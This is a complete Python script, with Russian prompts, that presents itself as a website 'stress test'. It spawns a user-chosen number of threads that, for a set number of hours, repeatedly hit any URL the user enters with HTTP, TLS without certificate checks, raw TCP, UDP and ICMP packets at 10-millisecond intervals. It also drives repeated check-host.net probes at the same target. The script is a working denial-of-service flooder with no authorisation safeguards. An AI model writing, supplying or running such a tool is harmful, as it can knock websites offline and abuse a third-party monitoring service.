import requests
import socket
import os
import time
import threading
from urllib.parse import urlparse

def send_request(url):
    try:
        response = requests.get(url, timeout=10)
        return response.status_code
    except Exception as e:
        print(f'Ошибка отправки запроса: {e}')
        return None

def send_udp_request(url):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(b'Hello, world!', (urlparse(url).hostname, 443))
        return True
    except Exception as e:
        print(f'Ошибка отправки UDP-запроса: {e}')
        return False

def send_tcp_request(url):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((urlparse(url).hostname, 443))
        sock.send(f"GET / HTTP/1.1\r\nHost: {urlparse(url).hostname}\r\n\r\n".encode())
        return True
    except Exception as e:
        print(f'Ошибка отправки TCP-запроса: {e}')
        return False

def send_ping_request(url):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.sendto(b'\x08\x00\x00\x00\x00\x00\x00\x00', (urlparse(url).hostname, 0))
        return True
    except Exception as e:
        print(f'Ошибка отправки Ping-запроса: {e}')
        return False

def send_ssl_request(url):
    try:
        response = requests.get(url, verify=False)
        return response.status_code
    except Exception as e:
        print(f'Ошибка отправки SSL-запроса: {e}')
        return None

def send_http_request(url):
    try:
        response = requests.get(url)
        return response.status_code
    except Exception as e:
        print(f'Ошибка отправки HTTP-запроса: {e}')
        return None

def send_check_host_ping_request(url):
    try:
        response = requests.get(f'https://check-host.net/check-ping?host={url}&max_nodes=3')
        return response.status_code
    except Exception as e:
        print(f'Ошибка отправки Ping-запроса на check-host.net: {e}')
        return None

def send_check_host_http_request(url):
    try:
        response = requests.get(f'https://check-host.net/check-http?host={url}&max_nodes=3')
        return response.status_code
    except Exception as e:
        print(f'Ошибка отправки HTTP-запроса на check-host.net: {e}')
        return None

def send_check_host_tcp_request(url):
    try:
        response = requests.get(f'https://check-host.net/check-tcp?host={url}&max_nodes=3')
        return response.status_code
    except Exception as e:
        print(f'Ошибка отправки TCP-запроса на check-host.net: {e}')
        return None

def worker(url, hours):
    start_time = time.time()
    while time.time() - start_time < hours * 60 * 60:
        send_request(url)
        send_udp_request(url)
        send_tcp_request(url)
        send_ping_request(url)
        send_ssl_request(url)
        send_http_request(url)
        send_check_host_ping_request(url)
        send_check_host_http_request(url)
        send_check_host_tcp_request(url)
        time.sleep(0.01)

def clear_console():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        time.sleep(10)

def main():
    url = input('Введите URL сайта: ')
    hours = int(input('Введите количество часов для стресс-теста: '))
    threads = int(input('Введите количество потоков: '))

    clear_thread = threading.Thread(target=clear_console)
    clear_thread.daemon = True
    clear_thread.start()

    for _ in range(threads):
        thread = threading.Thread(target=worker, args=(url, hours))
        thread.start()

    while True:
        pass

if __name__ == '__main__':
    main()
